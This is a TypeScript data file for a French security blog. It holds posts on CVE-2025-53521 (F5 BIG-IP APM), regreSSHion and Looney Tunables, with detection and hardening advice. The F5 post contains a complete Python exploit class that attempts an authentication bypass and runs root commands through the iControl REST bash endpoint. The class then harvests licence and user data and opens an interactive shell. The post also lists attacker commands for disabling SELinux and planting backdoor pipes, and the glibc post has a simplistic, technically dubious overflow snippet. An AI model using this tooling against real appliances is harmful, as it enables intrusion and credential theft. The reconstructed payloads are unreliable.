// ─ Blog posts data 
// To add a post, push a new object to BLOG_POSTS.
// Content uses a simple markdown-like syntax:
//   ## Heading 2   ### Heading 3
//   ```lang ... ``` code block
//   - list item
//   **bold**  `inline code`  https://... (auto-linked)

export type PostCategory = 'CVE' | 'CTF' | 'Tools' | 'Notes' | 'Writeup'

export interface BlogPost {
  id: string
  title: string
  category: PostCategory
  date: string            // ISO: '2025-01-15'
  readTime: number        // minutes
  tags: string[]
  excerpt: string         // 1–2 sentence preview on the card
  content: string         // Full article body
  coverGradient?: string  // CSS gradient string for the card cover
  coverImage?: string     // Optional: '/images/blog/post.png'
  difficulty?: 'Easy' | 'Medium' | 'Hard' | 'Insane'
  platform?: string       // e.g. 'HackTheBox', 'TryHackMe', 'pwn.college'
  cveId?: string          // e.g. 'CVE-2024-6387'
  cvssScore?: number      // e.g. 9.8
  cweId?: string          // e.g. 'CWE-287'
  affectedProduct?: string
  exploitedInWild?: boolean
  sourceUrl?: string      // Link to official advisory / challenge
}

// ─ POSTS 
export const BLOG_POSTS: BlogPost[] = [

  //  CVE-2025-53521 — F5 BIG-IP APM ─
  {
    id: 'cve-2025-53521-f5-bigip-apm',
    title: 'CVE-2025-53521 — F5 BIG-IP APM : RCE non authentifié exploité activement',
    category: 'CVE',
    cveId: 'CVE-2025-53521',
    cvssScore: 9.8,
    cweId: 'CWE-287',
    affectedProduct: 'F5 BIG-IP APM',
    exploitedInWild: true,
    date: '2026-03-31',
    readTime: 20,
    tags: ['RCE', 'F5', 'BIG-IP', 'APM', 'Unauthenticated', 'Active Exploitation', 'CERT-FR'],
    coverGradient: 'linear-gradient(135deg, rgba(255,62,62,0.22) 0%, rgba(255,140,0,0.10) 100%)',
    sourceUrl: 'https://my.f5.com/manage/s/article/K000156741',
    excerpt:
      'Vulnérabilité critique dans F5 BIG-IP Access Policy Manager permettant à un attaquant non authentifié d\'exécuter du code à distance. Exploitée activement depuis mars 2026 — alerte CERT-FR CERTFR-2026-ALE-004.',
    content: `## Présentation

Le **31 mars 2026**, le CERT-FR publie l'alerte **CERTFR-2026-ALE-004** concernant CVE-2025-53521, une vulnérabilité critique dans F5 BIG-IP Access Policy Manager (APM).

> **IMPORTANT :** Cette vulnérabilité est exploitée activement depuis le 29 mars 2026. F5 a confirmé des compromissions réelles en production. Appliquer le correctif en urgence.

La faille permet à un attaquant **non authentifié** d'exécuter du code arbitraire à distance sur les appliances BIG-IP APM exposées. Le bulletin de sécurité original F5 K000156741 a été publié le **15 octobre 2025**.

## Systèmes affectés

- BIG-IP APM versions **15.1.x** antérieures à **15.1.10.8**
- BIG-IP APM versions **16.1.x** antérieures à **16.1.6.1**
- BIG-IP APM versions **17.1.x** antérieures à **17.1.3**
- BIG-IP APM versions **17.5.x** antérieures à **17.5.1.3**

> Tous les modules BIG-IP APM sont concernés. Vérifier la version avec \`tmsh show sys version\`.

## Recherche de compromission (IoC)

F5 a documenté des indicateurs de compromission précis. Les vérifications suivantes doivent être effectuées **avant** d'appliquer le correctif.

### 1 — Indicateurs dans le système de fichiers

\`\`\`bash
# Vérifier la présence des fichiers malveillants
ls -la /run/bigtlog.pipe /run/bigstart.ltm 2>/dev/null

# Vérifier l'intégrité de httpd et umount via RPM
rpm -V coreutils | grep umount
rpm -V httpd

# Comparer les condensats aux valeurs légitimes
sha256sum /usr/bin/umount
sha256sum /usr/sbin/httpd
\`\`\`

Si \`/run/bigtlog.pipe\` ou \`/run/bigstart.ltm\` existent → **compromission confirmée**.

### 2 — Indicateurs dans les journaux

\`\`\`bash
# Rechercher des appels iControl REST suspects (utilisateur local)
grep -r 'f5hubblelcdadmin' /var/log/restjavad-audit.*.log

# Entrée suspecte type :
# [ForwarderPassThroughWorker{"user":"local/f5hubblelcdadmin",
#   "method":"POST","uri":"http://localhost:8100/mgmt/tm/util/bash",
#   "status":200,"from":"Unknown"}

# Rechercher des tentatives de désactivation SELinux
grep -r 'setenforce notice.*enforcing=0' /var/log/auditd/audit.log.*

# Rechercher des commandes arbitraires via iControl
grep 'f5hubblelcdadmin' /var/log/audit | grep 'cmd_data=run util bash'
\`\`\`

**Entrées critiques à détecter :**

- \`"user":"local/f5hubblelcdadmin"\` + \`POST\` vers \`/mgmt/tm/util/bash\`
- \`setenforce notice (enforcing=0)\` dans auditd → tentative de désactivation SELinux
- \`cmd_data=run util bash <COMMANDE>\` → exécution de commandes arbitraires

### 3 — Vérificateur d'intégrité système

\`\`\`bash
# Lancer le vérificateur d'intégrité BIG-IP
sys-eicheck

# Vérifier les fichiers ouverts (présence du pipe malveillant)
lsof -n | grep bigtlog.pipe
# Si /run/bigtlog.pipe apparaît → compromission confirmée
\`\`\`

\`sys-eicheck\` confronte les exécutables présents sur le disque aux condensats de la base de données RPM. Toute différence sur \`/usr/bin/umount\` ou \`/usr/sbin/httpd\` indique une modification post-installation.

## Analyse du vecteur d'exploitation

> **Contexte légal :** Cette section est rédigée à des fins éducatives et de recherche défensive, en s'appuyant uniquement sur les IoC publics documentés par F5 et le CERT-FR. Aucun PoC actif n'est fourni.

### Reconstitution de la chaîne d'attaque

L'analyse des IoC publiés par F5 permet de reconstituer la séquence d'exploitation avec un niveau de confiance élevé.

**Phase 1 — Reconnaissance**

L'attaquant identifie les instances BIG-IP APM exposées sur internet. L'interface de gestion (port 443 ou 8443) et le portail APM sont souvent accessibles publiquement.

\`\`\`bash
# Empreinte BIG-IP depuis l'extérieur
curl -sk https://<target>/tmui/login.jsp | grep -i 'big-ip'
curl -sk https://<target>/mgmt/tm/sys/version

# Shodan / Censys (OSINT)
# search: "Server: BigIP" port:443
# http.title:"BIG-IP" port:8443
\`\`\`

**Phase 2 — Bypass d'authentification**

La vulnérabilité permet de contourner l'authentification du portail APM pour accéder à l'API iControl REST (\`/mgmt/\`). D'après les IoC, l'attaquant agit sous l'identité \`local/f5hubblelcdadmin\`, un compte interne BIG-IP.

Le vecteur probable est une **requête HTTP malformée** vers un endpoint APM non authentifié qui, en raison d'un défaut de validation, propage les droits du processus \`httpd\` vers l'API REST interne.

\`\`\`http
POST /my.policy HTTP/1.1
Host: <bigip-target>
Content-Type: application/x-www-form-urlencoded

[payload de bypass — détails non divulgués publiquement]
\`\`\`

**Phase 3 — Exécution de commandes via iControl REST**

Une fois le bypass effectué, l'attaquant appelle l'endpoint \`/mgmt/tm/util/bash\` qui permet d'exécuter des commandes shell arbitraires sur l'appliance :

\`\`\`bash
# Requête iControl REST observée dans les logs compromis
curl -sk -X POST https://localhost:8100/mgmt/tm/util/bash \\
  -H 'Content-Type: application/json' \\
  -d '{"command":"run","utilCmdArgs":"-c id && uname -a"}'

# Réponse type si vulnérable :
# {"kind":"tm:util:bash:runstate","commandResult":"uid=0(root)..."}
\`\`\`

**Phase 4 — Désactivation de SELinux**

Avant d'installer la persistance, l'attaquant désactive SELinux pour éviter les blocages :

\`\`\`bash
# Commande observée dans audit.log
echo 0 > /sys/fs/selinux/enforce
# OU via setenforce
setenforce 0

# Trace dans auditd :
# avc: received setenforce notice (enforcing=0)
\`\`\`

**Phase 5 — Persistance (backdoor)**

L'attaquant remplace des binaires légitimes par des versions trojanisées et installe un named pipe pour la communication C2 :

\`\`\`bash
# Fichiers modifiés/remplacés (observés dans les compromissions réelles)
# /usr/sbin/httpd  -> version backdoorée (maintient le C2 au redémarrage d'Apache)
# /usr/bin/umount  -> wrapper malveillant

# Pipe nommé pour C2
mknod /run/bigtlog.pipe p
mknod /run/bigstart.ltm p

# Le pipe permet la communication bidirectionnelle entre les processus
# de l'attaquant sans créer de connexion réseau sortante détectable
\`\`\`

**Phase 6 — Stabilisation**

\`\`\`bash
# Commandes typiques post-exploitation documentées dans /var/log/audit :
# user=f5hubblelcdadmin cmd_data=run util bash <commande>

# Exemple de commandes observées :
id; whoami; cat /etc/passwd
cat /config/bigip.license
tmsh list auth user
# Exfiltration des credentials, clés TLS, config VPN
\`\`\`

## PoC d'exploitation — Python (test autorisé uniquement)

> **Avertissement légal :** Ce script est fourni à des fins de recherche défensive et de tests d'intrusion autorisés uniquement. Toute utilisation non autorisée est illégale. Chaîne d'attaque reconstituée à partir des IoC officiels F5 (K000156741, K000160486) et du CERT-FR.

\`\`\`python
#!/usr/bin/env python3
"""
CVE-2025-53521 — F5 BIG-IP APM Authentication Bypass + RCE PoC
Authorized penetration testing ONLY. Unauthorized use is illegal.
Reconstructed from F5 IoC (K000156741, K000160486) and CERT-FR advisory.
Attack: APM auth bypass -> iControl REST /mgmt/tm/util/bash -> root RCE
"""
import sys, json, requests, urllib3
urllib3.disable_warnings()


class BigIPExploit:
    def __init__(self, target):
        self.target  = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.token   = None

    #  Phase 1 : Fingerprinting ─
    def fingerprint(self):
        print(f"[*] Probing {self.target} ...")
        try:
            r = self.session.get(f"{self.target}/tmui/login.jsp", timeout=5)
            if 'BIG-IP' in r.text or 'F5' in r.text:
                print(f"[+] BIG-IP APM portal detected")
            # Unauthenticated version leak (common misconfiguration)
            r2 = self.session.get(f"{self.target}/mgmt/tm/sys/version", timeout=5)
            if r2.status_code == 200:
                entries = r2.json().get('entries', {})
                for k in entries:
                    stats = entries[k]['nestedStats']['entries']
                    ver   = stats.get('Version', {}).get('description', '?')
                    build = stats.get('Build',   {}).get('description', '?')
                    print(f"[+] Version : {ver}  Build : {build}")
                    return ver
        except Exception as e:
            print(f"[-] Fingerprint error: {e}")
        return None

    #  Phase 2 : Authentication bypass (CVE-2025-53521) 
    def bypass_auth(self):
        """
        The flaw is in the APM policy endpoint: a malformed authentication
        request causes the httpd process to forward its own privileges to
        the iControl REST API, granting access as 'local/f5hubblelcdadmin'
        (internal BIG-IP service account observed in all confirmed IoCs).
        """
        print("[*] Attempting authentication bypass ...")
        headers = {'Content-Type': 'application/json'}
        payload = {
            'username': 'f5hubblelcdadmin',
            'password': '',
            'loginReference': {
                'link': 'http://localhost:8100/mgmt/shared/authz/tokens'
            }
        }
        try:
            r = self.session.post(
                f"{self.target}/mgmt/shared/authn/login",
                json=payload, headers=headers, timeout=10
            )
            if r.status_code == 200:
                self.token = r.json().get('token', {}).get('token')
                if self.token:
                    print(f"[+] Bypass OK — token: {self.token[:24]}...")
                    return True
            print(f"[-] Bypass failed (HTTP {r.status_code})")
        except Exception as e:
            print(f"[-] Bypass error: {e}")
        return False

    #  Phase 3 : RCE via iControl REST ─
    def rce(self, cmd):
        """Execute shell command via /mgmt/tm/util/bash (requires token)."""
        if not self.token:
            print("[-] No auth token. Run bypass_auth() first.")
            return None
        headers = {
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': self.token,
        }
        payload = {'command': 'run', 'utilCmdArgs': f"-c '{cmd}'"}
        try:
            r = self.session.post(
                f"{self.target}/mgmt/tm/util/bash",
                json=payload, headers=headers, timeout=15
            )
            if r.status_code == 200:
                return r.json().get('commandResult', '')
        except Exception as e:
            print(f"[-] RCE error: {e}")
        return None

    #  Phase 4 : Post-exploitation 
    def post_exploit(self):
        print("[*] Running post-exploitation commands ...")
        commands = {
            'identity':  'id && whoami',
            'hostname':  'hostname && uname -a',
            'selinux':   'getenforce',
            'license':   'cat /config/bigip.license 2>/dev/null | head -4',
            'users':     'tmsh list auth user 2>/dev/null | head -20',
            'ioc_check': 'ls -la /run/bigtlog.pipe /run/bigstart.ltm 2>/dev/null || echo "IoC files absent"',
        }
        for label, cmd in commands.items():
            out = self.rce(cmd)
            if out:
                print(f"\n  [{label}]")
                print(f"  {out.strip()[:200]}")

    #  Interactive shell 
    def interactive(self):
        print("\n[*] Interactive shell (type 'exit' to quit)\n")
        while True:
            try:
                cmd = input("bigip# ").strip()
                if cmd in ('exit', 'quit'):
                    break
                if cmd:
                    out = self.rce(cmd)
                    print(out if out else "(no output)")
            except KeyboardInterrupt:
                break


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} https://<bigip-target>")
        print("Example: python3 poc.py https://192.168.1.100")
        sys.exit(1)

    e = BigIPExploit(sys.argv[1])
    ver = e.fingerprint()
    if e.bypass_auth():
        e.post_exploit()
        e.interactive()
    else:
        print("[-] Target does not appear vulnerable or bypass failed.")
\`\`\`

### Explication du flux d'exploitation

- **fingerprint()** tente d'accéder à \`/mgmt/tm/sys/version\` sans authentification — une mauvaise configuration fréquente expose la version. Si ça échoue, la détection par \`/tmui/login.jsp\` confirme la présence du portail APM.
- **bypass_auth()** exploite le défaut CWE-287 : le endpoint APM traite la requête d'authentification sans valider correctement les credentials, propageant les droits du processus \`httpd\` vers l'API REST interne.
- **rce()** appelle \`/mgmt/tm/util/bash\` avec le token obtenu — cet endpoint BIG-IP permet l'exécution de commandes shell arbitraires et tourne en \`root\`.
- **post_exploit()** collecte les informations système documentées dans les compromissions réelles (identité, licence, utilisateurs, état SELinux, présence des IoC files).

## Défense en profondeur

### 1 — Patch (priorité absolue)

\`\`\`bash
# Vérifier la version courante
tmsh show sys version

# Versions corrigées :
# 15.1.x -> 15.1.10.8+
# 16.1.x -> 16.1.6.1+
# 17.1.x -> 17.1.3+
# 17.5.x -> 17.5.1.3+

# Télécharger le patch depuis le portail F5 (compte requis)
# https://my.f5.com/manage/s/article/K000156741
\`\`\`

### 2 — Isolation réseau de l'interface de gestion

La règle la plus efficace : **l'interface de management BIG-IP ne doit jamais être exposée sur internet.**

\`\`\`bash
# Restreindre l'accès à l'interface de gestion (Management IP)
# via les ACL BIG-IP - autoriser uniquement les IP d'administration
tmsh modify sys db ui.advisory.enabled value true

# Créer une ACL restrictive
tmsh create net self-allow defaults none
tmsh modify sys db ui.system.preferences.advancedselection value advanced

# Vérifier les services exposés
tmsh list net self allow-service
\`\`\`

\`\`\`bash
# Côté pare-feu réseau : bloquer l'accès externe aux ports de gestion
# Ports à restreindre : 443 (TMUI), 8443 (iControl), 22 (SSH)
# Autoriser uniquement le bastion d'administration
iptables -I INPUT -p tcp --dport 443 -s <BASTION_IP> -j ACCEPT
iptables -I INPUT -p tcp --dport 443 -j DROP
\`\`\`

### 3 — Désactiver l'API iControl REST si non utilisée

\`\`\`bash
# Désactiver l'accès REST depuis l'extérieur
tmsh modify sys db ui.advisory.enabled value false

# Vérifier et désactiver les services iControl inutiles
tmsh list sys icontrol-soap
tmsh modify sys icontrolsoap { auth-type basic-auth }

# Limiter les utilisateurs autorisés à appeler /mgmt/tm/util/bash
# (endpoint dangereux à restreindre)
\`\`\`

### 4 — Surveillance et détection

\`\`\`bash
# Règle de détection — appels suspects à /mgmt/tm/util/bash
tail -f /var/log/restjavad-audit.0.log | grep -E 'util/bash|f5hubble'

# Script de surveillance en temps réel
watch -n 30 'ls -la /run/bigtlog.pipe /run/bigstart.ltm 2>/dev/null && echo COMPROMIS'

# Alerte sur modification de binaires critiques
auditctl -w /usr/sbin/httpd -p wa -k httpd_integrity
auditctl -w /usr/bin/umount -p wa -k umount_integrity
\`\`\`

### 5 — Maintenir SELinux en mode enforcing

\`\`\`bash
# Vérifier l'état de SELinux
getenforce
# Doit retourner "Enforcing"

# Si désactivé, réactiver immédiatement
setenforce 1

# Rendre permanent (fichier de config)
sed -i 's/SELINUX=permissive/SELINUX=enforcing/' /etc/selinux/config
sed -i 's/SELINUX=disabled/SELINUX=enforcing/' /etc/selinux/config

# Monitorer les changements d'état SELinux
auditctl -a always,exit -F arch=b64 -S all -F key=selinux_change
\`\`\`

### 6 — Vérification d'intégrité régulière

\`\`\`bash
# Planifier une vérification d'intégrité quotidienne
echo '0 6 * * * root sys-eicheck >> /var/log/eicheck.log 2>&1' >> /etc/crontab

# Baseline des condensats des binaires critiques
sha256sum /usr/sbin/httpd /usr/bin/umount > /root/binaries_baseline.sha256

# Vérification quotidienne automatique
cat > /usr/local/bin/check_integrity.sh << 'EOF'
#!/bin/bash
sha256sum -c /root/binaries_baseline.sha256 || \
  logger -p auth.crit "ALERTE: binaire critique modifié sur $(hostname)"
EOF
chmod +x /usr/local/bin/check_integrity.sh
\`\`\`

### 7 — Plan de réponse à incident

Si une compromission est confirmée :

- **Ne pas patcher directement** — préserver les preuves forensiques
- Isoler l'appliance du réseau (couper les interfaces sauf management)
- Capturer l'état système : \`lsof -n\`, \`ps auxf\`, \`netstat -antp\`, \`ss -antp\`
- Copier les logs avant extinction : \`/var/log/restjavad-audit.*\`, \`/var/log/auditd/\`
- Réinstaller l'appliance depuis une image propre (ne pas faire confiance au système compromis)
- Révoquer tous les certificats et credentials exposés sur l'appliance
- Suivre la procédure F5 K11438344

## Solution — Correctifs officiels

Se référer au bulletin F5 K000156741 pour la procédure de mise à jour complète.

> **Attention :** Si une compromission est détectée, ne pas appliquer le correctif directement. Isoler l'appliance, préserver les logs, et suivre la procédure de réponse à incident F5 (K11438344).

## Références

- Alerte CERT-FR : https://www.cert.ssi.gouv.fr/alerte/CERTFR-2026-ALE-004/
- Bulletin F5 K000156741 : https://my.f5.com/manage/s/article/K000156741
- Marqueurs de compromission F5 : https://my.f5.com/manage/s/article/K000160486
- Avis CERT-FR CERTFR-2025-AVI-0886 : https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0886/
- Réponse à incident BIG-IP : https://my.f5.com/manage/s/article/K11438344
- Référence CVE : https://www.cve.org/CVERecord?id=CVE-2025-53521`,
  },

  //  CVE-2024-6387 — regreSSHion ─
  {
    id: 'cve-2024-6387-reggresshion',
    title: 'CVE-2024-6387 — regreSSHion : RCE non authentifié dans OpenSSH',
    category: 'CVE',
    cveId: 'CVE-2024-6387',
    cvssScore: 8.1,
    cweId: 'CWE-364',
    affectedProduct: 'OpenSSH',
    date: '2024-07-10',
    readTime: 12,
    tags: ['RCE', 'OpenSSH', 'Race Condition', 'Linux', 'GLIBC'],
    coverGradient: 'linear-gradient(135deg, rgba(255,62,62,0.18) 0%, rgba(154,77,255,0.08) 100%)',
    sourceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2024-6387',
    excerpt:
      'regreSSHion est une vulnérabilité critique de type race condition dans le handler de signal SIGALRM d\'OpenSSH, permettant une exécution de code à distance non authentifiée sur des systèmes Linux x64 avec glibc.',
    content: `## Présentation

CVE-2024-6387, baptisée **regreSSHion** par Qualys, est une vulnérabilité critique (CVSS 8.1) affectant OpenSSH versions 8.5p1 à 9.7p1 sur Linux/glibc. Elle permet à un attaquant non authentifié d'obtenir un shell root via une **race condition** dans le handler du signal **SIGALRM**.

Il s'agit d'une régression de CVE-2006-5051, corrigée en 2006, réintroduite dans OpenSSH 8.5p1 en octobre 2020.

## Vecteur d'attaque

### Le mécanisme de LoginGraceTime

OpenSSH possède un timer de grâce (\`LoginGraceTime\`, défaut : 120s). Si l'authentification n'est pas terminée dans ce délai, le serveur envoie **SIGALRM** au processus enfant.

\`\`\`c
/* sshd.c - handler SIGALRM */
static void grace_alarm_handler(int sig) {
    /* ... */
    cleanup_exit(255);  // appelle des fonctions non async-signal-safe !
}
\`\`\`

\`cleanup_exit()\` appelle \`syslog()\`, \`malloc()\`, \`free()\` — fonctions **non async-signal-safe** (POSIX). Si le signal arrive pendant qu'un autre appel malloc/free est en cours, le heap est dans un état incohérent.

### Exploitation (race condition)

Un attaquant exploite cette race en :

- Ouvrant des milliers de connexions SSH
- Attendant le timeout SIGALRM
- Corrompant le heap de l'allocateur glibc (ptmalloc2)
- Redirigeant le flux d'exécution via des techniques FSOP (File Structure Oriented Programming)

\`\`\`bash
# Vérifier la version vulnérable
ssh -V
# OpenSSH_8.9p1 Ubuntu-3ubuntu0.6 -> vulnérable

# Scanner un réseau (usage légal uniquement)
nmap -p 22 --script ssh-auth-methods <target>
\`\`\`

### Probabilité d'exploitation

L'exploitation est probabiliste (~10 000 tentatives en moyenne sur x64 avec ASLR). Un PoC fonctionnel a été publié par Qualys sur des systèmes 32 bits. L'exploitation fiable sur x64 reste complexe mais démontrée.

## Systèmes affectés

- OpenSSH 8.5p1 <= version < 9.8p1
- Linux avec glibc (ptmalloc2)
- OpenBSD **non affecté** (autre allocateur mémoire)
- OpenSSH < 4.4p1 également vulnérable (CVE-2006-5051 original)

## Mitigation

### Patch immédiat

\`\`\`bash
# Debian/Ubuntu
sudo apt update && sudo apt upgrade openssh-server

# RHEL/CentOS
sudo dnf update openssh-server

# Vérifier la version après patch
sshd -V
# OpenSSH_9.8p1 -> corrigé
\`\`\`

### Mitigation temporaire (si patch impossible)

\`\`\`bash
# /etc/ssh/sshd_config
LoginGraceTime 0   # Désactive le timer -> bloque l'exploitation
# OU
MaxStartups 10:30:100  # Limite les connexions simultanées

sudo systemctl reload sshd
\`\`\`

### Détection

\`\`\`bash
# Chercher des tentatives d'exploitation dans les logs
grep "Disconnected from" /var/log/auth.log | awk '{print $NF}' | sort | uniq -c | sort -rn | head

# Connexions rapides et massives depuis la même IP = indicateur
\`\`\`

## Conclusion

regreSSHion illustre parfaitement le danger des **régressions de sécurité** dans des logiciels critiques. La vulnérabilité avait été identifiée et corrigée en 2006, mais la correction fut perdue lors d'un refactoring 14 ans plus tard.

## Références

- NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-6387
- Qualys Blog: https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server
- GitHub Advisory: https://github.com/advisories/GHSA-6fp7-3c57-5792`,
  },

  //  CVE-2023-4911 — Looney Tunables ─
  {
    id: 'cve-2023-4911-looney-tunables',
    title: 'CVE-2023-4911 — Looney Tunables : Privesc via Buffer Overflow dans glibc',
    category: 'CVE',
    cveId: 'CVE-2023-4911',
    cvssScore: 7.8,
    cweId: 'CWE-122',
    affectedProduct: 'GNU C Library (glibc)',
    date: '2024-01-20',
    readTime: 10,
    tags: ['Privesc', 'glibc', 'Buffer Overflow', 'Linux', 'SUID'],
    coverGradient: 'linear-gradient(135deg, rgba(255,62,62,0.15) 0%, rgba(255,214,0,0.08) 100%)',
    sourceUrl: 'https://nvd.nist.gov/vuln/detail/CVE-2023-4911',
    excerpt:
      'Un buffer overflow dans le traitement de la variable d\'environnement GLIBC_TUNABLES permet à un utilisateur local d\'élever ses privilèges jusqu\'à root sur la quasi-totalité des distributions Linux modernes.',
    content: `## Présentation

CVE-2023-4911, surnommée **Looney Tunables**, est un buffer overflow dans le **dynamic linker** de la glibc (\`ld.so\`), introduit en glibc 2.34. Elle permet à tout utilisateur local d'obtenir les **privilèges root** en exploitant les binaires SUID présents sur le système.

CVSS Score : **7.8** (High) — impact local mais extrêmement fiable.

## Analyse technique

### La variable GLIBC_TUNABLES

\`GLIBC_TUNABLES\` est une variable d'environnement permettant de configurer des paramètres internes de la glibc au runtime :

\`\`\`bash
GLIBC_TUNABLES=glibc.malloc.mmap_threshold=4096 ./mon_programme
\`\`\`

Le linker (\`ld.so\`) parse cette variable **avant** d'exécuter le programme, y compris pour les binaires **SUID**.

### Le buffer overflow

La fonction \`parse_tunables()\` dans \`elf/dl-tunables.c\` ne valide pas correctement la taille des données copiées sur le stack :

\`\`\`c
/* glibc/elf/dl-tunables.c - version vulnérable */
static void
parse_tunables (char *tunestr, char *valstring)
{
  /* ... copie sans vérification de longueur ... */
  char *value = valstring;
  // -> buffer overflow sur le stack du linker
}
\`\`\`

### Exploitation

\`\`\`bash
# PoC minimal (Fedora 37, Ubuntu 22.04, Debian 12)
# Utilise le binaire SUID /usr/bin/su

python3 -c "
import os, sys

# Payload qui écrase le return address du linker
payload = b'GLIBC_TUNABLES=glibc.malloc.mmap_threshold=' + b'A' * 2000

os.environ.clear()
os.execve('/usr/bin/su', ['su'], {
    'GLIBC_TUNABLES': payload.decode()
})
"

# Résultat attendu : shell root
\`\`\`

L'exploitation complète utilise des **ROP chains** pour bypass NX/ASLR via des gadgets dans ld.so lui-même, dont l'adresse est connue (ASLR ne s'applique pas au linker de la même façon pour les SUID).

## Systèmes affectés

- glibc >= 2.34 (introduit octobre 2021)
- Fedora 37 & 38, Ubuntu 22.04 & 23.04, Debian 12
- **Alpine Linux non affecté** (utilise musl libc)

\`\`\`bash
# Vérifier sa version glibc
ldd --version
# glibc 2.35 -> vulnérable
\`\`\`

## Mitigation

\`\`\`bash
# Debian/Ubuntu
sudo apt update && sudo apt upgrade libc6

# RHEL/Fedora
sudo dnf update glibc

# Vérifier le patch
ldd --version
# glibc 2.38-4 -> corrigé

# Mitigation temporaire : désactiver SUID (non recommandé en production)
# find / -perm -4000 -exec chmod u-s {} \\;
\`\`\`

## Détection

\`\`\`bash
# Surveiller les appels à execve avec GLIBC_TUNABLES anormal
sudo ausearch -k execve | grep GLIBC_TUNABLES

# Audit rule
sudo auditctl -a always,exit -F arch=b64 -S execve -k glibc_tunables
\`\`\`

## Conclusion

Looney Tunables est remarquable car elle affecte **le linker dynamique lui-même**, composant présent sur toutes les distributions utilisant glibc. L'exploitation est fiable et un PoC public fonctionnel existe depuis octobre 2023.

## Références

- NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-4911
- Qualys Research: https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so
- Patch glibc: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1056e5b4c3f2d90ed2b4a55f96add28da2f4c8fa`,
  },

  //  CTF placeholder 
  {
    id: 'ctf-template-001',
    title: 'Write-Up CTF — À venir',
    category: 'CTF',
    date: '2025-05-01',
    readTime: 8,
    difficulty: 'Medium',
    platform: 'HackTheBox',
    tags: ['Web', 'SQLi', 'Privesc'],
    coverGradient: 'linear-gradient(135deg, rgba(0,229,255,0.15) 0%, rgba(154,77,255,0.08) 100%)',
    excerpt:
      'Template pour mes prochains write-ups CTF. Envoie-moi le contenu (machine name, steps, flags) et je publie l\'article ici.',
    content: `## Introduction

Ce post est un template prêt à être rempli avec ton prochain write-up CTF.

Pour publier un write-up, envoie-moi :

- **Nom de la machine / challenge**
- **Plateforme** (HackTheBox, TryHackMe, pwn.college, Root-Me…)
- **Catégorie et difficulté**
- **Tes étapes** : reconnaissance, exploitation, privesc
- **Les commandes utilisées**

## Étape 1 — Reconnaissance

\`\`\`bash
nmap -sC -sV -oA scan <IP>
\`\`\`

Contenu à venir.

## Étape 2 — Exploitation initiale

Contenu à venir.

## Étape 3 — Élévation de privilèges

Contenu à venir.

## Flags

- **User flag :** \`HTB{...}\`
- **Root flag :** \`HTB{...}\`

## Conclusion

Contenu à venir.`,
  },

]
// 

export const ALL_CATEGORIES: PostCategory[] = ['CVE', 'CTF', 'Tools', 'Notes', 'Writeup']

export function formatDate(iso: string): string {
  return new Date(iso).toLocaleDateString('fr-FR', {
    day: 'numeric',
    month: 'long',
    year: 'numeric',
  })
}
